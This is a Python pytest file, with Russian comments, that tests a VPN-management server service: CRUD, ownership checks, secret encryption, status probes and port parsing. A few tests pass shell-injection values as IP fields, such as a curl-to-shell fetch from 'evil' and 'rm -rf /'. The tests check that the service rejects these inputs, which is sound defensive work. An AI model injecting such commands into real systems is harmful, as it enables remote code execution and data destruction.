"""Интеграционные тесты ServerService: list/get/create/update/check/run_tick и _parse_port.

Сетевой зонд probe_tcp мокается monkeypatch'ем (SQLite, без сети).
Провижининг (delete/vpn_op/sync) намеренно не тестируется.
"""

from __future__ import annotations

import pytest
from pytest_lazy_fixtures import lf

import vpnhub.services.servers as srv_mod
from tests.factories.orm import make_server, make_user, seed
from vpnhub.common.catalog import DEFAULT_PORTS
from vpnhub.core.errors import BadRequest, NotFound
from vpnhub.infra.probe import ProbeResult
from vpnhub.services.servers import ServerService, _parse_port

pytestmark = pytest.mark.integration


@pytest.fixture
def probe_online(monkeypatch: pytest.MonkeyPatch) -> None:
    """Замокать probe_tcp так, будто SSH-порт доступен (ok=True, latency 12 мс)."""

    async def fake(host: str, port: int, timeout: float) -> ProbeResult:
        return ProbeResult(True, 12, "SSH")

    monkeypatch.setattr(srv_mod, "probe_tcp", fake)


@pytest.fixture
def probe_offline(monkeypatch: pytest.MonkeyPatch) -> None:
    """Замокать probe_tcp так, будто сервер недоступен (ok=False)."""

    async def fake(host: str, port: int, timeout: float) -> ProbeResult:
        return ProbeResult(False, None, "таймаут")

    monkeypatch.setattr(srv_mod, "probe_tcp", fake)


# --- _parse_port (модульная функция) ---------------------------------------


async def test__parse_port__valid_string__returns_int() -> None:
    """Корректная строка порта → соответствующее целое число."""
    # Arrange / Act
    port = _parse_port("2222")
    # Assert
    assert port == 2222


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("  22  ", 22),  # обрезаются пробелы
        ("notaport", 22),  # не число → дефолт
        (None, 22),  # None → дефолт
        ("0", 22),  # вне диапазона → дефолт
        ("70000", 22),  # вне диапазона → дефолт
    ],
)
async def test__parse_port__invalid_or_edge__returns_default(raw: str | None, expected: int) -> None:
    """Мусор/None/выход за 1..65535 → дефолтный порт 22."""
    # Arrange / Act
    port = _parse_port(raw)
    # Assert
    assert port == expected


# --- list -------------------------------------------------------------------


async def test__list__only_owner_servers__filters_by_owner(uow, settings, session_maker) -> None:
    """list возвращает только серверы владельца, не чужие."""
    # Arrange
    async with seed(session_maker) as s:
        owner = await make_user(s, phone="+79001110001")
        other = await make_user(s, phone="+79001110002")
        await make_server(s, owner_id=owner.id, name="мой", ip="203.0.113.1")
        await make_server(s, owner_id=other.id, name="чужой", ip="203.0.113.2")
    svc = ServerService(uow, settings)
    # Act
    result = await svc.list(owner.id)
    # Assert
    assert [srv["name"] for srv in result] == ["мой"]


async def test__list__server_has_secret__returns_decrypted(uow, settings, session_maker) -> None:
    """list расшифровывает ssh-секрет и отдаёт его в поле secret."""
    # Arrange
    owner_id = (await _create_with_secret(uow, settings, session_maker, secret="mypass"))["owner_id"]
    svc = ServerService(uow, settings)
    # Act
    result = await svc.list(owner_id)
    # Assert
    assert result[0]["secret"] == "mypass"


# --- get --------------------------------------------------------------------


async def test__get__own_server__returns_it(uow, settings, session_maker) -> None:
    """get своего сервера возвращает его данные."""
    # Arrange
    async with seed(session_maker) as s:
        owner = await make_user(s, phone="+79001110010")
        server = await make_server(s, owner_id=owner.id, name="srv-a", ip="203.0.113.10")
    svc = ServerService(uow, settings)
    # Act
    result = await svc.get(owner.id, server.id)
    # Assert
    assert result["id"] == server.id
    assert result["name"] == "srv-a"


async def test__get__foreign_server__raises_not_found(uow, settings, session_maker) -> None:
    """get чужого сервера → NotFound (владелец не совпал)."""
    # Arrange
    async with seed(session_maker) as s:
        owner = await make_user(s, phone="+79001110020")
        other = await make_user(s, phone="+79001110021")
        server = await make_server(s, owner_id=other.id, ip="203.0.113.20")
    svc = ServerService(uow, settings)
    # Act / Assert
    with pytest.raises(NotFound) as exc:
        await svc.get(owner.id, server.id)
    assert exc.value.http_status == 404


@pytest.fixture
def empty_name() -> dict:
    """Данные создания с пустым name (только пробелы)."""
    return {"name": "   ", "ip": "203.0.113.30"}


@pytest.fixture
def empty_ip() -> dict:
    """Данные создания с пустым ip."""
    return {"name": "srv", "ip": "", "location": "DE"}


@pytest.fixture
def empty_location() -> dict:
    """Данные создания с пустой локацией (только пробелы)."""
    return {"name": "srv", "ip": "203.0.113.31", "location": "   "}


# --- create -----------------------------------------------------------------


@pytest.mark.parametrize("data", [lf("empty_name"), lf("empty_ip"), lf("empty_location")])
async def test__create__empty_name_or_ip_or_location__raises_bad_request(uow, settings, session_maker, data) -> None:
    """Пустое name, ip или локация → BadRequest (все три обязательны)."""
    # Arrange
    async with seed(session_maker) as s:
        owner = await make_user(s, phone="+79001110030")
    svc = ServerService(uow, settings)
    # Act / Assert
    with pytest.raises(BadRequest) as exc:
        await svc.create(owner.id, data)
    assert exc.value.http_status == 400


@pytest.mark.parametrize(
    "bad_ip",
    ['1.1.1.1"; curl evil|sh #', "$(reboot)", "host name", "a;b", "10.0.0.1 && rm -rf /", "`id`"],
)
async def test__create__shell_unsafe_ip__raises_bad_request(uow, settings, session_maker, bad_ip) -> None:
    """IP/host с shell-метасимволами отвергается на границе (anti-injection в provisioning)."""
    # Arrange
    async with seed(session_maker) as s:
        owner = await make_user(s, phone="+79001110035")
    svc = ServerService(uow, settings)
    # Act / Assert
    with pytest.raises(BadRequest) as exc:
        await svc.create(owner.id, {"name": "srv", "ip": bad_ip})
    assert exc.value.http_status == 400


async def test__update__shell_unsafe_ip__raises_bad_request(uow, settings, session_maker) -> None:
    """Обновление ip тоже валидируется."""
    # Arrange
    async with seed(session_maker) as s:
        owner = await make_user(s, phone="+79001110036")
    svc = ServerService(uow, settings)
    created = await svc.create(owner.id, {"name": "srv", "ip": "203.0.113.36", "location": "DE"})
    # Act / Assert
    with pytest.raises(BadRequest):
        await svc.update(owner.id, created["id"], {"ip": "1.1.1.1; rm -rf /"})


async def test__create__hostname_ip__accepted(uow, settings, session_maker) -> None:
    """Валидный FQDN как host принимается (не только IP-литерал)."""
    # Arrange
    async with seed(session_maker) as s:
        owner = await make_user(s, phone="+79001110037")
    svc = ServerService(uow, settings)
    # Act
    created = await svc.create(owner.id, {"name": "srv", "ip": "vm0000001.example.com", "location": "DE"})
    # Assert
    assert created["ip"] == "vm0000001.example.com"


async def test__create__valid__creates_server_with_fields(uow, settings, session_maker) -> None:
    """Валидные данные → сервер сохранён с переданными полями."""
    # Arrange
    async with seed(session_maker) as s:
        owner = await make_user(s, phone="+79001110040")
    svc = ServerService(uow, settings)
    # Act
    created = await svc.create(owner.id, {"name": "prod-1", "ip": "203.0.113.40", "location": "DE"})
    # Assert
    assert created["name"] == "prod-1"
    assert created["ip"] == "203.0.113.40"
    assert created["location"] == "DE"
    assert created["status"] == "unknown"


async def test__create__valid__creates_vpns_with_default_ports(uow, settings, session_maker) -> None:
    """create заводит ServerVpn для каждого типа VPN (VPN_TYPES) с портами из DEFAULT_PORTS."""
    # Arrange
    async with seed(session_maker) as s:
        owner = await make_user(s, phone="+79001110050")
    svc = ServerService(uow, settings)
    # Act
    created = await svc.create(owner.id, {"name": "srv", "ip": "203.0.113.50", "location": "DE"})
    # Assert
    ports_by_type = {v["type"]: v["port"] for v in created["vpns"]}
    assert ports_by_type == {t: DEFAULT_PORTS[t] for t in srv_mod.VPN_TYPES}


async def test__create__with_secret__stored_encrypted_returned_decrypted(uow, settings, session_maker) -> None:
    """ssh-секрет шифруется в БД, но get возвращает его расшифрованным."""
    # Arrange
    async with seed(session_maker) as s:
        owner = await make_user(s, phone="+79001110060")
    svc = ServerService(uow, settings)
    # Act
    created = await svc.create(owner.id, {"name": "srv", "ip": "203.0.113.60", "location": "DE", "secret": "mypass"})
    fetched = await svc.get(owner.id, created["id"])
    # Assert: в БД зашифровано (не равно исходнику), а наружу — исходник
    async with session_maker() as check_s:
        row = await check_s.get(srv_mod.m.Server, created["id"])
        assert row.ssh_secret_encrypted not in (None, "", "mypass")
    assert fetched["secret"] == "mypass"


# --- update -----------------------------------------------------------------


async def test__update__changes_fields(uow, settings, session_maker) -> None:
    """update меняет переданные поля сервера."""
    # Arrange
    async with seed(session_maker) as s:
        owner = await make_user(s, phone="+79001110070")
        server = await make_server(s, owner_id=owner.id, name="старое", ip="203.0.113.70")
    svc = ServerService(uow, settings)
    # Act
    result = await svc.update(owner.id, server.id, {"name": "новое", "location": "NL"})
    # Assert
    assert result["name"] == "новое"
    assert result["location"] == "NL"


async def test__update__empty_location__raises_bad_request(uow, settings, session_maker) -> None:
    """Локация обязательна: попытка очистить её через update → BadRequest."""
    # Arrange
    async with seed(session_maker) as s:
        owner = await make_user(s, phone="+79001110071")
        server = await make_server(s, owner_id=owner.id, name="srv", ip="203.0.113.71")
    svc = ServerService(uow, settings)
    # Act / Assert
    with pytest.raises(BadRequest) as exc:
        await svc.update(owner.id, server.id, {"location": "   "})
    assert exc.value.http_status == 400


async def test__update__foreign_server__raises_not_found(uow, settings, session_maker) -> None:
    """update чужого сервера → NotFound."""
    # Arrange
    async with seed(session_maker) as s:
        owner = await make_user(s, phone="+79001110080")
        other = await make_user(s, phone="+79001110081")
        server = await make_server(s, owner_id=other.id, ip="203.0.113.80")
    svc = ServerService(uow, settings)
    # Act / Assert
    with pytest.raises(NotFound):
        await svc.update(owner.id, server.id, {"name": "хочу чужое"})


async def test__update__nonempty_secret__reencrypts_and_returns_new(uow, settings, session_maker) -> None:
    """Непустой secret в update перешифровывается и возвращается расшифрованным (новое значение)."""
    # Arrange
    async with seed(session_maker) as s:
        owner = await make_user(s, phone="+79001110090")
    svc = ServerService(uow, settings)
    created = await svc.create(
        owner.id, {"name": "srv", "ip": "203.0.113.90", "location": "DE", "secret": "old-secret"}
    )
    # Act
    updated = await svc.update(owner.id, created["id"], {"secret": "new-secret"})
    # Assert
    assert updated["secret"] == "new-secret"


async def test__update__empty_secret__keeps_old(uow, settings, session_maker) -> None:
    """Пустой secret в update не затирает ранее сохранённый (условие if data.get('secret'))."""
    # Arrange
    async with seed(session_maker) as s:
        owner = await make_user(s, phone="+79001110091")
    svc = ServerService(uow, settings)
    created = await svc.create(owner.id, {"name": "srv", "ip": "203.0.113.91", "location": "DE", "secret": "keep-me"})
    # Act
    updated = await svc.update(owner.id, created["id"], {"secret": ""})
    # Assert
    assert updated["secret"] == "keep-me"


# --- check ------------------------------------------------------------------


async def test__check__probe_ok__sets_online_and_latency(uow, settings, session_maker, probe_online) -> None:
    """check при успешном зонде → status online и выставленная латентность."""
    # Arrange
    async with seed(session_maker) as s:
        owner = await make_user(s, phone="+79001110100")
        server = await make_server(s, owner_id=owner.id, ip="203.0.113.100", status="unknown")
    svc = ServerService(uow, settings)
    # Act
    result = await svc.check(owner.id, server.id)
    # Assert
    assert result["status"] == "online"
    assert result["latency"] == "12 мс"


async def test__check__probe_fails__sets_offline_and_no_latency(uow, settings, session_maker, probe_offline) -> None:
    """check при неуспешном зонде → status offline и латентность отсутствует."""
    # Arrange
    async with seed(session_maker) as s:
        owner = await make_user(s, phone="+79001110110")
        server = await make_server(s, owner_id=owner.id, ip="203.0.113.110", status="online")
    svc = ServerService(uow, settings)
    # Act
    result = await svc.check(owner.id, server.id)
    # Assert
    assert result["status"] == "offline"
    assert result["latency"] is None


# --- run_tick ---------------------------------------------------------------


async def test__run_tick__multiple_servers__marks_all_and_returns_count(
    uow, settings, session_maker, probe_online
) -> None:
    """run_tick проставляет статус всем серверам и возвращает их количество."""
    # Arrange
    async with seed(session_maker) as s:
        owner = await make_user(s, phone="+79001110120")
        await make_server(s, owner_id=owner.id, name="s1", ip="203.0.113.121", status="unknown")
        await make_server(s, owner_id=owner.id, name="s2", ip="203.0.113.122", status="unknown")
        await make_server(s, owner_id=owner.id, name="s3", ip="203.0.113.123", status="unknown")
    svc = ServerService(uow, settings)
    # Act
    count = await svc.run_tick()
    # Assert
    assert count == 3
    servers = await svc.list(owner.id)
    assert all(srv["status"] == "online" for srv in servers)


async def test__run_tick__no_servers__returns_zero(uow, settings, session_maker, probe_online) -> None:
    """run_tick без серверов → 0 (ранний выход)."""
    # Arrange
    svc = ServerService(uow, settings)
    # Act
    count = await svc.run_tick()
    # Assert
    assert count == 0


# --- vpn_op: валидация входа (срабатывает до провижининга/SSH) --------------


async def test__vpn_op__unknown_vpn_type__raises_bad_request(uow, settings, session_maker):
    """Неизвестный тип VPN → BadRequest 400 ещё до обращения к провижинингу/серверу."""
    # Arrange
    svc = ServerService(uow, settings)
    # Act / Assert
    with pytest.raises(BadRequest, match="тип VPN") as exc:
        await svc.vpn_op("owner-id", "server-id", "wireguard", "install")
    assert exc.value.http_status == 400


async def test__vpn_op__unknown_operation__raises_bad_request(uow, settings, session_maker):
    """Неизвестная операция (при валидном типе VPN) → BadRequest до провижининга."""
    # Arrange
    svc = ServerService(uow, settings)
    # Act / Assert
    with pytest.raises(BadRequest, match="операц"):
        await svc.vpn_op("owner-id", "server-id", "amnezia", "reboot")


# --- helpers ----------------------------------------------------------------


async def _create_with_secret(uow, settings, session_maker, *, secret: str) -> dict:
    """Создать пользователя+сервер через сервис с заданным секретом; вернуть owner_id/server_id."""
    async with seed(session_maker) as s:
        owner = await make_user(s, phone="+79008880001")
    svc = ServerService(uow, settings)
    created = await svc.create(owner.id, {"name": "srv", "ip": "203.0.113.200", "location": "DE", "secret": secret})
    return {"owner_id": owner.id, "server_id": created["id"]}
